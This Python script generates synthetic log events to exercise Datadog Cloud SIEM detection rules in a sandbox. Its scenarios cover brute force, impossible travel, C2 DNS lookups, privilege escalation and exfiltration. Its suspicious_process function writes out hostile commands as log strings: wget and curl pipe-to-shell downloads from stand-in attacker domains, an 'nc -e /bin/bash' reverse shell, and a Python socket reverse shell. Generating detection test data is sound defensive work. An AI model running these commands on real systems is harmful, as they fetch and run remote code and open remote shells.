#!/usr/bin/env python3
"""
Cloud SIEM Event Generator

Produces log lines that match common Datadog Cloud SIEM detection rules.
Outputs to stdout (pipe to a file that the Datadog Agent tails) or writes
directly to a log file.

Usage:
    python event-generator.py                     # Run all scenarios once
    python event-generator.py --loop --interval 30  # Run continuously
    python event-generator.py --scenario brute_force  # Run specific scenario
    python event-generator.py --output /var/log/sandbox/security.log
"""

import argparse
import json
import random
import sys
import time
from datetime import datetime, timezone

# Fake source IPs for attack simulation
ATTACKER_IPS = [
    "198.51.100.42",    # Known bad IP (RFC 5737 documentation range)
    "203.0.113.99",     # Another documentation range
    "192.0.2.200",      # Documentation range
    "45.33.32.156",     # Scanme-like
]

INTERNAL_IPS = [
    "10.0.1.50",
    "10.0.2.100",
    "172.16.0.15",
]

USERNAMES = ["admin", "root", "testuser", "bits", "deploy", "service-account"]

GEO_LOCATIONS = [
    {"city": "New York", "country": "US", "lat": 40.7128, "lon": -74.0060},
    {"city": "Moscow", "country": "RU", "lat": 55.7558, "lon": 37.6173},
    {"city": "Beijing", "country": "CN", "lat": 39.9042, "lon": 116.4074},
    {"city": "Lagos", "country": "NG", "lat": 6.5244, "lon": 3.3792},
    {"city": "San Francisco", "country": "US", "lat": 37.7749, "lon": -122.4194},
]

C2_DOMAINS = [
    "evil-c2-server.xyz",
    "malware-update.top",
    "data-exfil-node.cc",
    "botnet-controller.tk",
]


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def emit(log_entry, output):
    line = json.dumps(log_entry) if isinstance(log_entry, dict) else str(log_entry)
    if output:
        with open(output, "a") as f:
            f.write(line + "\n")
    else:
        print(line, flush=True)


def brute_force(output=None):
    """Generate failed SSH login attempts (brute force pattern)."""
    print("[SIEM] Generating: Brute force SSH login attempts", file=sys.stderr)
    ip = random.choice(ATTACKER_IPS)
    for _ in range(15):
        user = random.choice(USERNAMES)
        emit({
            "timestamp": ts(),
            "source": "sshd",
            "service": "ssh",
            "host": "sandbox-host",
            "message": f"Failed password for {user} from {ip} port {random.randint(40000, 65000)} ssh2",
            "evt": {"name": "authentication", "outcome": "failure"},
            "network": {"client": {"ip": ip}},
            "usr": {"name": user},
            "severity": "warning",
        }, output)
        time.sleep(0.2)
    # One success after the failures
    emit({
        "timestamp": ts(),
        "source": "sshd",
        "service": "ssh",
        "host": "sandbox-host",
        "message": f"Accepted password for root from {ip} port 54321 ssh2",
        "evt": {"name": "authentication", "outcome": "success"},
        "network": {"client": {"ip": ip}},
        "usr": {"name": "root"},
        "severity": "critical",
    }, output)


def impossible_travel(output=None):
    """Generate auth events from geographically distant locations in quick succession."""
    print("[SIEM] Generating: Impossible travel", file=sys.stderr)
    user = "admin"
    loc1 = GEO_LOCATIONS[0]  # New York
    loc2 = GEO_LOCATIONS[1]  # Moscow

    emit({
        "timestamp": ts(),
        "source": "auth",
        "service": "webapp",
        "host": "sandbox-host",
        "message": f"User {user} logged in from {loc1['city']}, {loc1['country']}",
        "evt": {"name": "authentication", "outcome": "success"},
        "network": {"client": {"ip": ATTACKER_IPS[0], "geo": loc1}},
        "usr": {"name": user},
    }, output)

    time.sleep(2)

    emit({
        "timestamp": ts(),
        "source": "auth",
        "service": "webapp",
        "host": "sandbox-host",
        "message": f"User {user} logged in from {loc2['city']}, {loc2['country']}",
        "evt": {"name": "authentication", "outcome": "success"},
        "network": {"client": {"ip": ATTACKER_IPS[1], "geo": loc2}},
        "usr": {"name": user},
    }, output)


def suspicious_dns(output=None):
    """Generate DNS queries to known C2/malware domains."""
    print("[SIEM] Generating: Suspicious DNS queries", file=sys.stderr)
    for domain in C2_DOMAINS:
        emit({
            "timestamp": ts(),
            "source": "dns",
            "service": "resolver",
            "host": "sandbox-host",
            "message": f"DNS query for {domain} from {random.choice(INTERNAL_IPS)}",
            "dns": {"question": {"name": domain, "type": "A"}},
            "network": {"client": {"ip": random.choice(INTERNAL_IPS)}},
            "severity": "high",
        }, output)
        time.sleep(0.5)


def privilege_escalation(output=None):
    """Generate sudo/su failure and unusual privilege escalation events."""
    print("[SIEM] Generating: Privilege escalation attempts", file=sys.stderr)
    for _ in range(5):
        user = random.choice(["testuser", "www-data", "nobody"])
        emit({
            "timestamp": ts(),
            "source": "sudo",
            "service": "auth",
            "host": "sandbox-host",
            "message": f"{user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
            "evt": {"name": "privilege_escalation", "outcome": "failure"},
            "usr": {"name": user},
            "severity": "high",
        }, output)
        time.sleep(0.3)


def suspicious_process(output=None):
    """Generate events for unusual process execution."""
    print("[SIEM] Generating: Suspicious process execution", file=sys.stderr)
    commands = [
        ("base64", "base64 -d /tmp/encoded_payload | bash"),
        ("wget", "wget -q http://evil-c2-server.xyz/shell.sh -O /tmp/shell.sh"),
        ("nc", "nc -e /bin/bash 198.51.100.42 4444"),
        ("curl", "curl -s http://malware-update.top/payload | sh"),
        ("python3", "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"198.51.100.42\",4444))'"),
    ]
    for proc_name, cmd in commands:
        emit({
            "timestamp": ts(),
            "source": "process",
            "service": "audit",
            "host": "sandbox-host",
            "message": f"Suspicious process execution: {cmd}",
            "process": {"name": proc_name, "command_line": cmd, "pid": random.randint(1000, 65000)},
            "usr": {"name": "www-data"},
            "severity": "critical",
        }, output)
        time.sleep(0.5)


def data_exfiltration(output=None):
    """Generate events suggesting data exfiltration."""
    print("[SIEM] Generating: Data exfiltration patterns", file=sys.stderr)
    for _ in range(3):
        emit({
            "timestamp": ts(),
            "source": "network",
            "service": "firewall",
            "host": "sandbox-host",
            "message": f"Large outbound transfer to {random.choice(ATTACKER_IPS)}: {random.randint(50, 500)}MB",
            "network": {
                "client": {"ip": random.choice(INTERNAL_IPS)},
                "destination": {"ip": random.choice(ATTACKER_IPS), "port": 443},
                "bytes_written": random.randint(50_000_000, 500_000_000),
            },
            "severity": "high",
        }, output)
        time.sleep(1)


SCENARIOS = {
    "brute_force": brute_force,
    "impossible_travel": impossible_travel,
    "suspicious_dns": suspicious_dns,
    "privilege_escalation": privilege_escalation,
    "suspicious_process": suspicious_process,
    "data_exfiltration": data_exfiltration,
}


def main():
    parser = argparse.ArgumentParser(description="Cloud SIEM Event Generator")
    parser.add_argument("--scenario", choices=list(SCENARIOS.keys()), help="Run a specific scenario")
    parser.add_argument("--output", help="Write to file instead of stdout")
    parser.add_argument("--loop", action="store_true", help="Run continuously")
    parser.add_argument("--interval", type=int, default=60, help="Seconds between loops (default: 60)")
    args = parser.parse_args()

    while True:
        if args.scenario:
            SCENARIOS[args.scenario](args.output)
        else:
            for name, fn in SCENARIOS.items():
                fn(args.output)
                time.sleep(2)

        if not args.loop:
            break

        print(f"[SIEM] Sleeping {args.interval}s before next round...", file=sys.stderr)
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
